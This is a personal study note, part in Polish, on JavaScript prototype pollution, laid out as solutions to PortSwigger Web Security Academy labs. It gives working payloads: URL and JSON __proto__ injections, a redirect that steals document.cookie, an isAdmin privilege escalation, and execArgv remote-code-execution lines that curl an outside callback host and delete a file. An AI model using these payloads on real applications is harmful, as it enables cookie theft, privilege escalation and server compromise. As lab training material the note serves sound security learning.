
Sokołowska Katarzyna1
pt., 24 kwi, 11:01 (1 dzień temu)
do mnie

prototyp pollution – Java Script vulnerability to global js object pollution – jak zatruć całą aplikacje XSSem.

Zatrucie object prototyp skutkuje zatruciem wszystkich obiektów w aplikacji. Zagrozenie: DOM XSS, RCE

 

 

DOM Invader ✅ wykrywa: - client-side prototype pollution - XSS przez __proto__ w URL/hash - zanieczyszczenie przez localStorage

DOM Invader ❌ NIE wykrywa: - server-side PP (Node.js memory) - blind PP bez refleksji w odpowiedzi

 

 

 

URL payload:

https://vulnerable-website.com/?__proto__[evilProperty]=payload

 

vulnerable-website.com/?__proto__.foo=bar

 

Json payload:

{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }

 

Np.

{

"address_line_1":"Wiener HQ",

"address_line_2":"One Wiener Way",

"city":"Wienerville",

"postcode": "BU1 1RP",

"country":"UK",

"sessionId":"n1qwxAf3yrpkhm0kEssS0E0acZXbBp6V",

"__proto__"{

"status": "599"

}}

 

Browser console – creating own object

let myObject = {};

 

As with any property, you can access __proto__ using either bracket or dot notation:

username.__proto__ username['__proto__']

You can even chain references to __proto__ to work your way up the prototype chain:

username.__proto__ // String.prototype username.__proto__.__proto__ // Object.prototype username.__proto__.__proto__.__proto__ // null

 

 

 

Server-side

Identify a prototype pollution source

 

"__proto__": { "json spaces":10 }




<h2>Lab: Client-side prototype pollution via browser APIs</h2>
<h2>Lab: DOM XSS via client-side prototype pollution</h2>
<h2>Lab: DOM XSS via an alternative prototype pollution vector  (For syntax error add – in the end: /?__proto__.sequence=alert%281%29-)</h2>
<h2>Lab: Client-side prototype pollution via flawed sanitization</h2>
<h2>Lab: Client-side prototype pollution in third-party libraries</h2>

<script>location=”https://0ab7006e04ed115a82eb158400a300f5.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29”</script>
kradzieży danych poprzez automatyczne przekierowaniu ofiary po odwiedzeniu strony

 

No login

DOM VADER: Prototyp pollution ON
DOM VADER: Scan for gadgets
DOM VADER: Exploit!

<br><br>
<hr>
<br><br>
<h2>Lab: Privilege escalation via server-side prototype pollution (Node.js and the Express framework)</h2>

Log in – DODAĆ PRZECINEK PRZED PAYLOADEM

 

,

"__proto__": {

    "isAdmin":true

}


<br><br>
<hr>
<br><br>
<h2>Lab: Detecting server-side prototype pollution without polluted property reflection</h2>

0. Log in
1. intentionally breaks the syntax
2. Notice that although you received a 500 error response, the error object contains a status property with the value 400.
3. Fix and Remember that this must be between 400 and 599:  "__proto__": { "status":555 }

<img width="1017" height="487" alt="image" src="https://github.com/user-attachments/assets/0c912b5d-9bdf-4326-9354-65d7b6691f71" />
<br>

<img width="1007" height="547" alt="image" src="https://github.com/user-attachments/assets/ff527de8-197e-47de-9b68-ea66e80b333f" />

<br><br>
<hr>
<br><br>
<h2>Lab: Bypassing flawed input filters for server-side prototype pollution</h2>
<img width="1017" height="485" alt="image" src="https://github.com/user-attachments/assets/cdb403ec-8e30-4f06-a054-92972b11b9a6" />

<br>

<img width="1038" height="541" alt="image" src="https://github.com/user-attachments/assets/e4fb66f2-4fe8-4b52-83eb-1a66c9ef40c7" />

<br><br>
<hr>
<br><br>
<h2>Lab: Remote code execution via server-side prototype pollution</h2>

"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }

Browser > admin panel > run jobs

Poll now

"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
